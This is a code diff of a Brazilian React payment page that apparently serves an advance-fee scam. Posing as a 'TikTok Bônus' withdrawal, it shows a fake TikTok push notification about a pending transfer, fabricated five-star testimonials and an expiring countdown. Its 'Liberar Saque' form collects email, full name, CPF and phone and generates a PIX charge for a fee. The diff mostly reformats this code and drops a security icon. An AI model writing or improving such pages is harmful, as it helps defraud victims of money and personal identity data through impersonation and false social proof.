@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { trackTikTokEvent } from "@/lib/tiktok-tracking";
-import { CheckCircle2, Star, Loader2, Copy, Check, Shield } from "lucide-react";
+import { CheckCircle2, Star, Loader2, Copy, Check } from "lucide-react";
 import { QRCodeSVG } from "qrcode.react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
@@ -18,66 +18,66 @@ const TAX = 32.71;
 const SALDO = TARGET_BALANCE;
 
 const testimonials = [
-  {
-    name: "Matheus Henrique Santos",
-    text: '"rapazz e nao foi que esse ngc do bônus deu boa aqui tbm familia KKKKKK"',
-    avatar: testimonialMatheus,
-  },
-  {
-    name: "Ana Paula Silva",
-    text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
-    avatar: testimonialAna,
-  },
-  {
-    name: "Carlos Eduardo",
-    text: '"pensei que era golpe mas recebi na hora, top demais!!"',
-    avatar: testimonialCarlos,
-  },
-];
+{
+  name: "Matheus Henrique Santos",
+  text: '"rapazz e nao foi que esse ngc do bônus deu boa aqui tbm familia KKKKKK"',
+  avatar: testimonialMatheus
+},
+{
+  name: "Ana Paula Silva",
+  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
+  avatar: testimonialAna
+},
+{
+  name: "Carlos Eduardo",
+  text: '"pensei que era golpe mas recebi na hora, top demais!!"',
+  avatar: testimonialCarlos
+}];
+
 
 const PushNotification = ({
   show,
   exiting,
   isIOS,
-  onDismiss,
-}: {
-  show: boolean;
-  exiting: boolean;
-  isIOS: boolean;
-  onDismiss: () => void;
-}) => {
+  onDismiss
+
+
+
+
+
+}: {show: boolean;exiting: boolean;isIOS: boolean;onDismiss: () => void;}) => {
   if (!show) return null;
   return (
     <div
       className="fixed z-[9999] cursor-pointer"
       onClick={onDismiss}
       style={{
-        animation: exiting
-          ? "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards"
-          : "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
+        animation: exiting ?
+        "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards" :
+        "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
         top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
         left: isIOS ? "6px" : "12px",
-        right: isIOS ? "6px" : "12px",
-      }}
-    >
-      {isIOS ? (
-        <img
-          src={notifIos}
-          alt="Transferência pendente"
-          className="w-full max-w-md mx-auto rounded-[22px]"
-          style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
-          loading="eager"
-          decoding="async"
-        />
-      ) : (
-        <div
-          className="rounded-2xl p-4 mx-auto max-w-md"
-          style={{
-            fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
-            background: "#2a2a2e",
-            boxShadow: "0 6px 24px rgba(0,0,0,0.3)",
-          }}
-        >
+        right: isIOS ? "6px" : "12px"
+      }}>
+
+      {isIOS ?
+      <img
+        src={notifIos}
+        alt="Transferência pendente"
+        className="w-full max-w-md mx-auto rounded-[22px]"
+        style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
+        loading="eager"
+        decoding="async" /> :
+
+
+      <div
+        className="rounded-2xl p-4 mx-auto max-w-md"
+        style={{
+          fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
+          background: "#2a2a2e",
+          boxShadow: "0 6px 24px rgba(0,0,0,0.3)"
+        }}>
+
           <div className="flex items-center gap-2 mb-2">
             <img src={tiktokRound} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
             <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
@@ -94,9 +94,9 @@ const PushNotification = ({
             <img src={tiktokRound} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
           </div>
         </div>
-      )}
-    </div>
-  );
+      }
+    </div>);
+
 };
 
 const Pagamento = () => {
@@ -152,10 +152,10 @@ const Pagamento = () => {
             name: nomeCompleto.trim(),
             email: email.trim(),
             document,
-            phone,
+            phone
           },
-          ...(Object.keys(utms).length > 0 && { metadata: utms }),
-        },
+          ...(Object.keys(utms).length > 0 && { metadata: utms })
+        }
       });
 
       if (error) throw error;
@@ -164,7 +164,7 @@ const Pagamento = () => {
         setPixData({
           qr_code: data.qr_code,
           qr_code_base64: data.qr_code_base64,
-          transaction_id: data.transaction_id,
+          transaction_id: data.transaction_id
         });
         setShowNotification(true);
         setTimeout(() => setExitingNotification(true), 5000);
@@ -178,7 +178,7 @@ const Pagamento = () => {
       toast({
         title: "Erro no pagamento",
         description: err instanceof Error ? err.message : "Tente novamente em instantes.",
-        variant: "destructive",
+        variant: "destructive"
       });
     } finally {
       setLoading(false);
@@ -208,31 +208,31 @@ const Pagamento = () => {
         show={showNotification && !dismissNotification}
         exiting={exitingNotification}
         isIOS={isIOS}
-        onDismiss={handleDismissNotification}
-      />
+        onDismiss={handleDismissNotification} />
+
 
       {/* Expiration banner — same style as Pix page */}
       <div style={{ background: "#000", padding: "10px 0", textAlign: "center" }}>
         <p style={{ fontSize: 12, fontWeight: 600, color: "#fff", letterSpacing: "0.05em", margin: 0, display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
           PAGAMENTO EXPIRA EM
-          {[pad(0), minutes, seconds].map((v, i) => (
-            <span key={i} style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
+          {[pad(0), minutes, seconds].map((v, i) =>
+          <span key={i} style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
               {i > 0 && <span style={{ color: "#fff" }}>-</span>}
               <span
-                style={{
-                  background: timeLeft <= 60 ? "#FE2C55" : "#E6E6E6",
-                  color: timeLeft <= 60 ? "#fff" : "#000",
-                  fontWeight: 700,
-                  fontSize: 10,
-                  padding: "2px 6px",
-                  borderRadius: 3,
-                  fontVariantNumeric: "tabular-nums",
-                }}
-              >
+              style={{
+                background: timeLeft <= 60 ? "#FE2C55" : "#E6E6E6",
+                color: timeLeft <= 60 ? "#fff" : "#000",
+                fontWeight: 700,
+                fontSize: 10,
+                padding: "2px 6px",
+                borderRadius: 3,
+                fontVariantNumeric: "tabular-nums"
+              }}>
+
                 {v}
               </span>
             </span>
-          ))}
+          )}
         </p>
       </div>
 
@@ -265,7 +265,7 @@ const Pagamento = () => {
           <div className="flex items-center gap-3">
             <img src={pixLogo3} alt="Pix" className="h-5 w-5" loading="eager" decoding="async" />
             <div className="flex items-center gap-1.5">
-              <Shield className="h-3.5 w-3.5 text-gray-400" />
+              
               <span className="text-[11px] text-gray-400">Pagamento seguro via PIX</span>
             </div>
           </div>
@@ -284,8 +284,8 @@ const Pagamento = () => {
                 onChange={(e) => setEmail(e.target.value)}
                 placeholder="seuemail@exemplo.com"
                 className="w-full border-b border-gray-300 pb-2 text-black placeholder:text-gray-300 outline-none bg-transparent"
-                style={{ fontSize: "16px" }}
-              />
+                style={{ fontSize: "16px" }} />
+
             </div>
             <div>
               <label className="text-sm font-semibold text-black block mb-2">Nome completo</label>
@@ -295,8 +295,8 @@ const Pagamento = () => {
                 onChange={(e) => setNomeCompleto(e.target.value)}
                 placeholder="Nome e sobrenome"
                 className="w-full border-b border-gray-300 pb-2 text-black placeholder:text-gray-300 outline-none bg-transparent"
-                style={{ fontSize: "16px" }}
-              />
+                style={{ fontSize: "16px" }} />
+
             </div>
             <div>
               <label className="text-sm font-semibold text-black block mb-2">CPF</label>
@@ -306,16 +306,16 @@ const Pagamento = () => {
                 value={cpf}
                 onChange={(e) => {
                   const digits = e.target.value.replace(/\D/g, "").slice(0, 11);
-                  const formatted = digits
-                    .replace(/(\d{3})(\d)/, "$1.$2")
-                    .replace(/(\d{3})(\d)/, "$1.$2")
-                    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+                  const formatted = digits.
+                  replace(/(\d{3})(\d)/, "$1.$2").
+                  replace(/(\d{3})(\d)/, "$1.$2").
+                  replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                   setCpf(formatted);
                 }}
                 placeholder="000.000.000-00"
                 className="w-full border-b border-gray-300 pb-2 text-black placeholder:text-gray-300 outline-none bg-transparent"
-                style={{ fontSize: "16px" }}
-              />
+                style={{ fontSize: "16px" }} />
+
             </div>
           </div>
         </div>
@@ -327,25 +327,25 @@ const Pagamento = () => {
           className="w-full h-14 rounded-2xl text-base font-bold text-white transition-all disabled:opacity-40"
           style={{
             background: !isFormValid || loading || !!pixData ? "#F1F1F3" : "#FE2C55",
-            color: !isFormValid || loading || !!pixData ? "#D4D4D4" : "#fff",
-          }}
-        >
-          {loading ? (
-            <span className="flex items-center justify-center gap-2">
+            color: !isFormValid || loading || !!pixData ? "#D4D4D4" : "#fff"
+          }}>
+
+          {loading ?
+          <span className="flex items-center justify-center gap-2">
               <Loader2 className="h-5 w-5 animate-spin" /> Gerando PIX...
-            </span>
-          ) : pixData ? (
-            <span className="flex items-center justify-center gap-2">
+            </span> :
+          pixData ?
+          <span className="flex items-center justify-center gap-2">
               <CheckCircle2 className="h-5 w-5" /> PIX Gerado
-            </span>
-          ) : (
-            "Liberar Saque"
-          )}
+            </span> :
+
+          "Liberar Saque"
+          }
         </button>
 
         {/* QR Code result */}
-        {pixData && (
-          <div className="rounded-2xl border border-gray-200 p-5 text-center space-y-4">
+        {pixData &&
+        <div className="rounded-2xl border border-gray-200 p-5 text-center space-y-4">
             <div className="inline-flex items-center justify-center h-12 w-12 rounded-full mx-auto bg-green-50">
               <CheckCircle2 className="h-6 w-6 text-green-500" />
             </div>
@@ -359,32 +359,32 @@ const Pagamento = () => {
             </div>
 
             <button
-              onClick={handleCopyPix}
-              className="w-full h-12 rounded-xl text-[13px] font-bold text-white transition-all flex items-center justify-center gap-2 bg-black"
-            >
-              {copied ? (
-                <>
+            onClick={handleCopyPix}
+            className="w-full h-12 rounded-xl text-[13px] font-bold text-white transition-all flex items-center justify-center gap-2 bg-black">
+
+              {copied ?
+            <>
                   <Check className="h-4 w-4" style={{ color: "#25F4EE" }} /> Copiado!
-                </>
-              ) : (
-                <>
+                </> :
+
+            <>
                   <Copy className="h-4 w-4" /> Copiar Código PIX
                 </>
-              )}
+            }
             </button>
 
             <p className="text-[11px] text-gray-400">
               Confirmação automática em até 2 minutos após pagamento.
             </p>
           </div>
-        )}
+        }
 
         {/* Testimonials */}
         <div className="pt-2">
           <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-3">O que estão dizendo</p>
           <div className="flex gap-3 overflow-x-auto pb-3 -mx-4 px-4 snap-x snap-mandatory" style={{ scrollbarWidth: "none", msOverflowStyle: "none", WebkitOverflowScrolling: "touch" }}>
-            {testimonials.map((t) => (
-              <div key={t.name} className="min-w-[260px] max-w-[260px] rounded-2xl border border-gray-200 p-4 snap-start shrink-0">
+            {testimonials.map((t) =>
+            <div key={t.name} className="min-w-[260px] max-w-[260px] rounded-2xl border border-gray-200 p-4 snap-start shrink-0">
                 <div className="flex items-center gap-2.5 mb-2">
                   <div className="h-8 w-8 rounded-full overflow-hidden shrink-0">
                     <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
@@ -392,15 +392,15 @@ const Pagamento = () => {
                   <div>
                     <p className="text-[12px] font-bold text-black">{t.name}</p>
                     <div className="flex gap-0.5">
-                      {Array.from({ length: 5 }).map((_, i) => (
-                        <Star key={i} className="h-2.5 w-2.5 fill-yellow-400 text-yellow-400" />
-                      ))}
+                      {Array.from({ length: 5 }).map((_, i) =>
+                    <Star key={i} className="h-2.5 w-2.5 fill-yellow-400 text-yellow-400" />
+                    )}
                     </div>
                   </div>
                 </div>
                 <p className="text-[11px] leading-relaxed text-gray-500">{t.text}</p>
               </div>
-            ))}
+            )}
           </div>
         </div>
 
@@ -412,8 +412,8 @@ const Pagamento = () => {
           .
         </p>
       </div>
-    </div>
-  );
+    </div>);
+
 };
 
 export default Pagamento;
